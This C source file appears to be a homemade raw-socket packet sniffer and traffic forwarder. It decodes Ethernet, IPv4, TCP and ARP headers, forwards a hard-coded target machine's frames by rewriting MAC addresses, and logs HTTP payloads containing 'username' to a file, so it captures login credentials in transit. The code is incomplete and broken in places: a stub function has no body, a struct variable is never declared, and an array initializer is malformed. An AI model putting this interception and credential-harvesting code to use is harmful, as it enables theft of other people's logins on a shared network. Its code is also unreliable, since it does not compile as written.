#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>


//link Layer Sock Discriptor 
typedef struct {
                  unsigned short sll_family;
                  unsigned short sll_protocol;
                  int            sll_ifindex;
                  unsigned short sll_hatype;
                  unsigned char  sll_pkttype;
                  unsigned char  sll_halen;
                  unsigned char  sll_addr[8];  
}__attribute__((packed)) LL_SockAddr;


//Ether Header 14 byte
typedef struct {
                       unsigned char dst_addr[6];
                       unsigned char src_addr[6];
                       unsigned int type : 16;
} __attribute__((packed)) EtherNetFram;

//IP Header 20 byte
typedef struct {
            unsigned int ver : 4; //bit
            unsigned int hl : 4; //bit
            unsigned int tos : 8;
            unsigned int tol : 16;
            unsigned int identity :16;
            unsigned int flags :3;
            unsigned int fragOffset :13;
            unsigned int ttl :8;
            unsigned int protocal :8;
            unsigned int h_chksum :16;
            unsigned char src_addr[4]; //byte
            unsigned char dst_addr[4]; //byte
}__attribute((packed)) IPv4Header;                      

//TCP Header 22 byte
typedef struct {
     unsigned int src_port : 16;
     unsigned int dst_port : 16;
     unsigned int seq_no   : 32;
     unsigned int ack_no   : 32;
     unsigned int offset   : 4;
     unsigned int reserved : 6;
     unsigned int flags    : 6;
     unsigned int window   : 16;
     unsigned int chk_sum  : 16;
     unsigned int urg_ptr  : 32; 

}__attribute((packed)) TCP_packet;

//ARP Header // 28 Byte
typedef struct {
      unsigned char HTYPE[2]; //Hardware type
      unsigned char PTYPE[2]; //Protocol type
      unsigned char HLEN[1];  //Hardware len
      unsigned char PLEN[1];  //Protocol len
      unsigned char OPER[2];  //Opration
      
      unsigned char SHA_2[2]; //Sender hardware Addr *first 2 byte
      unsigned char SHA_4[2]; // nxt 2 byte
      unsigned char SHA_6[2]; // last 2 byte
      
      unsigned char SPA_2[2]; //Sender Protocol Addr *first 2 byte
      unsigned char SPA_4[2]; // last 2 byte

      unsigned char THA_2[2]; //Target Hardware Addr *first 2 byte
      unsigned char THA_4[2];
      unsigned char THA_6[2]; 

      unsigned char TPA_2[2]; //Target Protocol Addr *first 2 byte
      unsigned char TPA_4[2];

}__attribute((packed)) ARP_Packet;

//Globel Var
int forwardSock;
int DataSize;
int run = 1;
int counter = 0;
char devider[] = "\n ********************************************************************";
unsigned char mac[6]; 
unsigned char ip[4];

unsigned char maskMac[]   = {0xd0,0x17,0xc2,0x9c,0x42,0x28};
unsigned char targetMac[] = {0x70,0x54,0xd2,0x44,0x95,0x9e};//lk  //{0xac,0x87,0xa3,0x2c,0x6b,0xaf}; //pk
int targetIp[4]={192.168.1.71};

EtherNetFram eth;
IPv4Header ipv4Header;
TCP_packet tcp;
ARP_Packet arp_packet;


 //DeCode EtherNet
 void decodeEther(unsigned char *buf, EtherNetFram *eth){
      //  printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
      //  printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
      //  printf("\n type => %02X:%02X",buf[12],buf[13]);
       memcpy(eth,buf,14);
 }

// DeCode IPv4 Header
void decodeIPv4(unsigned char *buf, IPv4Header *ipv4){
    memcpy(ipv4, &buf[14], 20);

  // printf("\n protocal :%02X",ipv4->protocal);
    // printf("\n header len :%d",ipv4->hl);
    // printf("\n payload len :%d",htons(ipv4->tol));
    // printf("\n frag flags :%03X",ipv4->flags);  
    // printf("\n Type of Service :%02X\n",ipv);   
    
    // printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4->src_addr[0], (int)ipv4->src_addr[1], (int)ipv4->src_addr[2], (int)ipv4->src_addr[3]);
    // printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4->dst_addr[0], (int)ipv4->dst_addr[1], (int)ipv4->dst_addr[2], (int)ipv4->dst_addr[3]);
}  

//Decode ARP
void decodeARP(unsigned char *buf, ARP_Packet *arp){
 memcpy(arp, &buf[14], 28);
 
 printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
 printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
 printf("\n src raw :%s",eth.src_addr);
 printf("\n type => %02X:%02X",buf[12],buf[13]);

 printf("\n Htype %02X,%02X",arp_packet.HTYPE[0],arp_packet.HTYPE[1]);
 printf("\n Ptype :%02x:%02x",arp_packet.PTYPE[0],arp_packet.PTYPE[1]);
 printf("\n OPER  :%02X,%02X",arp_packet.OPER[0],arp_packet.OPER[1]);
 printf("\n HLEN :%02X",arp_packet.HLEN[0]); 
 printf("\n PLEN :%02X",arp_packet.PLEN[0]);

 if(arp_packet.OPER[1] == 0x01){
   printf("  Request");
 }
 else{
   printf("  Replay");
 }

 printf("\n SHA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.SHA_2[0],arp_packet.SHA_2[1], arp_packet.SHA_4[0],arp_packet.SHA_4[1], arp_packet.SHA_6[0],arp_packet.SHA_6[1]);
 printf("  SPA => %d.%d.%d.%d",(int)arp_packet.SPA_2[0],(int)arp_packet.SPA_2[1], (int)arp_packet.SPA_4[0],(int)arp_packet.SPA_4[1]);
 printf("\n THA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.THA_2[0],arp_packet.THA_2[1], arp_packet.THA_4[0],arp_packet.THA_4[1], arp_packet.THA_6[0],arp_packet.THA_6[1]);
 printf("  TPA => %d.%d.%d.%d \n\n",(int)arp_packet.TPA_2[0],(int)arp_packet.TPA_2[1], (int)arp_packet.TPA_4[0],(int)arp_packet.TPA_4[1]);
}

void writeToFile(unsigned char *data, int len){ 
 FILE *logFile = fopen("/home/satyaprakash/Algo/log1.txt","ab");
      if(logFile == NULL){
        printf("Failed to open file ..\n");
      }
      else{
         printf("\n writing to File data:%d",len);
         fwrite(devider,1,len,logFile); //Devider
         //Src Dst mac
        //  memcpy(mac,eth.src_addr,6);
         
        //  fprintf(logFile,"%s",eth.src_addr);
        //  fprintf(logFile,"%s","\n");
        //  fprintf(logFile,"%s",ipv4Header.src_addr);
        //  fprintf(logFile,"%s","\n\n");
        //  fprintf(logFile,"%s",eth.dst_addr); 
        //  fprintf(logFile,"%s","\n");
        //  fprintf(logFile,"%s",ipv4Header.dst_addr); 
        //  fprintf(logFile,"%s","\n\n");
        
         fwrite(data,1,len,logFile); 
         fclose(logFile);
      }
   
  //  if(len > 10 )//&& counter > 50)
  //     run = 0; 

    // counter++;    
} 

//Function dec
void forward(unsigned char *buf); 
void setUpForwarding();
int isFromTraget();


//Decode TCP PAcket
void decodeTCP(unsigned char *buf, TCP_packet *tcp){
  memcpy(tcp,&buf[34],22);
  // printf("\n source port :%d",htons(tcp->src_port));
  // printf("\n destination port :%d",htons(tcp->dst_port));
  // printf("\n data offset :%02X",tcp->offset);
  // printf("\n window :%02X",tcp->window);
  
  int dataStart = (tcp->offset) * 4;
  // printf("\n data start :%d",dataStart);
  
   // 65 Header Size
   printf("\n payload size :%d",DataSize);
   if( (int)htons(tcp->dst_port) == 80 || (int)htons(tcp->src_port) == 80 ){
    printf("\n HTTP data.."); 
    int header = 65 + dataStart;
    if(DataSize - header > 0){
        unsigned char data [DataSize-header];
        printf("\n Header Size :%d",header);
        printf("\n data size :%lu",sizeof(data));
        memcpy(data,&buf[header], DataSize-header);

        printf("HTTP.. Payload ...");
        printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.src_addr[0], (int)ipv4Header.src_addr[1], (int)ipv4Header.src_addr[2], (int)ipv4Header.src_addr[3]);
        printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.dst_addr[0], (int)ipv4Header.dst_addr[1], (int)ipv4Header.dst_addr[2], (int)ipv4Header.dst_addr[3]);
        
        //chk is trafic from target then forward
        if(isFromTraget()){
          //Forward the tarfic 
          memcpy(&buf, &maskMac, 6); // dst macto mask mac 
          memcpy(&buf[6], &targetMac, 6); // change src mac back to target
          forward(buf);
        }

        if(strstr(data, "username"))
          writeToFile(data,sizeof(data));
    }
   }
}


//forward Data
int Sendstatus;
void forward(unsigned char *buf){
  Sendstatus = send(forwardSock, buf, DataSize, 0);
  if(Sendstatus < 0){
    printf('\n forwarding failed ..%d',errno);
  }
}
   
void setUpForwarding(){
    forwardSock = socket(AF_PACKET, SOCK_RAW, htons(0x0003));
    if(forwardSock > 0){
       printf("\n Forward socket is created ....");

      // initialize link layer sock discriptor 
      ll_sock_disc.sll_family   = AF_PACKET; // AF_PACKET *default
      ll_sock_disc.sll_protocol = htons(0x0003); // Not required  0 for nothing
      ll_sock_disc.sll_ifindex  = 2;
      ll_sock_disc.sll_hatype   = 0; // Not required  0 for nothing
      ll_sock_disc.sll_pkttype  = '0'; // Not required  0 for nothing
      ll_sock_disc.sll_halen    = '6';
      memcpy(ll_sock_disc.sll_addr, &maskMac, 6);
      

       //debug ll sock
       printf("\n\n family :%d",ll_sock_disc.sll_family);
       printf("\n protocol :%d",ll_sock_disc.sll_protocol);
       printf("\n if index :%d",ll_sock_disc.sll_ifindex);
       printf("\n hatype :%d",ll_sock_disc.sll_hatype);
       printf("\n pkt type :%c",ll_sock_disc.sll_pkttype);
       printf("\n ha-len :%02x",ll_sock_disc.sll_halen);
       printf("\n addre :=> %02x:%02x:%02x:%02x:%02x:%02x",ll_sock_disc.sll_addr[0], ll_sock_disc.sll_addr[1], ll_sock_disc.sll_addr[2], ll_sock_disc.sll_addr[3], ll_sock_disc.sll_addr[4], ll_sock_disc.sll_addr[5]);
       
       printf("\n LL Sock discriptor size :%d",(int) sizeof(ll_sock_disc));

      
        //Bind
         int bindStatus = bind(forwardSock, (struct sockaddr *)&ll_sock_disc, sizeof (ll_sock_disc) );
         printf("\n\n bind status :%d, errorCode :%d",bindStatus,errno); 
         if(bindStatus == -1)
           exit(0);
    }
    else{
      printf("\n forawrd sock creation failed :%d",errno);
      exit(0);
    }

}


int isFromTraget(){
   
  }

void main(){
  int MAXMSG = 65536;
  int socket_desc;
  struct sockaddr addr;
  unsigned char buf[MAXMSG];
  
  //Create and bind sock for forwarding
  setUpForwarding();

  socket_desc = socket(AF_PACKET, SOCK_PACKET,htons(0x0003));

  if(socket_desc == -1){
    printf("Failed to create socket ..\n");
  }
  else{
    printf("Socket created good to go :%d\n",socket_desc);
    // printf("htons ... : %X\n",htons(0x0003));
    int size =  sizeof addr;
    int data;
    while(run){
      DataSize = data = recvfrom(socket_desc, buf, sizeof(buf), 0, NULL, NULL);
      if(data < 0){
        printf("Can not get any packets, status :%d\n",data);
      }
      else{
        // printf("\n\n\n.........Intercept Some data size..%d\n",data);

        // EtherNetFram eth;
        decodeEther(buf,&eth);
        switch(htons(eth.type)){
          
          case 0x0800:
            // printf("\n\n It's IPv4 Packet."); 
            // IPv4Header ipv4Header;
            decodeIPv4(buf,&ipv4Header);
            if(ipv4Header.protocal == 0x06){ // its TCP
              printf("\n\n It's TCP Packet."); 
              // TCP_packet tcp;
              decodeTCP(buf,&tcp);
            }
          break;
          
          case 0x0806:
              // printf("\n It's ARP Packet.\n"); 
              // decodeARP( buf, &arp_packet);
          break;

          case 0x86DD:
              // printf("\n It's IPv6 Packet.\n"); 
          break;
        }
      }
    }//While 
  }
 // close(socket_desc);
}
